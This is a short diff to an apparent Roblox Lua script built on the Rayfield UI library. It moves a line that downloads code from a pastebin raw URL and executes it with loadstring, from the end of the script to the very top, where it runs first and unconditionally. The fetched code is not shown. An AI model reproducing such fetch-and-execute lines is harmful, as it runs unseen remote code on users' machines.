@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/9nNXtJRn"))()
+
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()
 
 local MainWindow = Rayfield:CreateWindow({
@@ -649,6 +651,3 @@ Rayfield:Notify({
    Duration = 20
 })
 
-task.wait(8)
-
-loadstring(game:HttpGet("https://pastebin.com/raw/9nNXtJRn"))()
